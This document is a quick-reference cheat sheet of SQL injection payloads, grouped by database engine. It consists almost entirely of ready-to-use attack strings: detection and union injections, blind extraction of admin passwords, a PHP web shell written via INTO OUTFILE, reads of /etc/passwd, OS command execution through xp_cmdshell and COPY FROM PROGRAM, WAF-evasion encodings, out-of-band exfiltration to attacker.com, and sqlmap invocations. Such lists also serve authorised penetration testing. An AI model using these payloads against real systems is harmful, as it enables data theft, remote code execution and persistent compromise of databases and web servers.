# SQLi Payloads

Quick reference by database type.

## Detection

```sql
'
''
`
``
"
""
;
' or '1'='1
' or ''='
' or 1=1--
" or 1=1--
or 1=1--
' AND '1'='1
' AND '1'='2
1' ORDER BY 1--
1' ORDER BY 10--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
1 AND 1=1
1 AND 1=2
1' AND SLEEP(5)--
```

## MySQL

```sql
-- Version/User
SELECT @@version
SELECT user()
SELECT current_user()
SELECT database()

-- Enumeration
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema='db'
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Union injection
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),@@version--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

-- Blind (boolean)
' AND SUBSTRING(user(),1,1)='r'--
' AND (SELECT COUNT(*) FROM users)>0--

-- Blind (time-based)
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

-- Error-based
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--

-- Write file
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Comments
-- comment
# comment
/* comment */
/*! MySQL-specific */
```

## PostgreSQL

```sql
-- Version/User
SELECT version()
SELECT current_user
SELECT session_user

-- Enumeration
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Union
' UNION SELECT NULL,version(),NULL--

-- Blind (time-based)
' AND pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Error-based
' AND 1=CAST((SELECT version()) AS INT)--

-- Stacked queries
'; CREATE TABLE pwned (data text)--

-- RCE (superuser)
'; COPY (SELECT 'test') TO '/tmp/test.txt'--
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--

-- String concat
'a' || 'b'
CONCAT('a','b')
```

## MSSQL

```sql
-- Version/User
SELECT @@version
SELECT user_name()
SELECT SYSTEM_USER

-- Enumeration
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')

-- Union
' UNION SELECT NULL,@@version,NULL--

-- Blind (time-based)
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--

-- Error-based
' AND 1=CONVERT(INT,@@version)--
' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- Stacked queries / xp_cmdshell
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- String concat
'a' + 'b'
```

## Oracle

```sql
-- Version/User
SELECT banner FROM v$version
SELECT user FROM dual
SELECT ora_database_name FROM dual

-- Enumeration
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- Union (requires same column count)
' UNION SELECT NULL,NULL,NULL FROM dual--

-- Blind (time-based)
' AND dbms_pipe.receive_message(('a'),5)=1--

-- String concat
'a' || 'b'

-- Comments
-- comment
/* comment */
```

## SQLite

```sql
-- Version
SELECT sqlite_version()

-- Tables
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE type='table' AND name='users'

-- Union
' UNION SELECT 1,sql,3 FROM sqlite_master--
```

## WAF Bypass

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- URL encoding
%53%45%4c%45%43%54 (SELECT)

-- Double URL encoding
%2553%2545%254c%2545%2543%2554

-- MySQL comments
/*!50000SELECT*/ @@version
SELECT/**/username/**/FROM/**/users

-- Whitespace alternatives
SELECT%09username%09FROM%09users
SELECT%0ausername%0aFROM%0ausers

-- Inline comments (MySQL)
SEL/**/ECT
UN/**/ION

-- Hex encoding
0x73656c656374 (select)

-- CHAR() encoding
CHAR(83,69,76,69,67,84)

-- Concat function bypass
CONCAT(0x73,0x65,0x6c,0x65,0x63,0x74)

-- Keyword alternatives
UNION ALL SELECT
/*!UNION*/ /*!SELECT*/

-- Null byte
%00' OR 1=1--
```

## Boolean-Based Blind

```sql
-- True condition (normal response)
' AND 1=1--

-- False condition (different response)
' AND 1=2--

-- Data extraction
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
```

## Time-Based Blind

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- PostgreSQL
' AND pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- Oracle
' AND dbms_pipe.receive_message(('a'),5)=1--

-- SQLite
' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--
```

## Out-of-Band (OOB)

```sql
-- MySQL (DNS)
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))

-- MSSQL (DNS)
'; exec master..xp_dirtree '\\attacker.com\a'--

-- Oracle (HTTP)
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual

-- PostgreSQL (DNS via copy)
COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'
```

## Second-Order SQLi

```sql
-- Register username
admin'--

-- Later query uses stored username
SELECT * FROM users WHERE username='admin'--'
```

## Tools

```bash
# sqlmap basic
sqlmap -u "https://target.com/?id=1" --dbs

# sqlmap with cookies
sqlmap -u "https://target.com/?id=1" --cookie="session=abc" --dbs

# sqlmap POST
sqlmap -u "https://target.com/login" --data="user=*&pass=test" --dbs

# sqlmap tamper scripts
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between --dbs
```

---

!!! tip "Test Order"
    `Detection` → `Identify DB type` → `Error/Union/Blind` → `Exfiltrate`

---
*Use [sqlmap](https://sqlmap.org) for automated exploitation.*
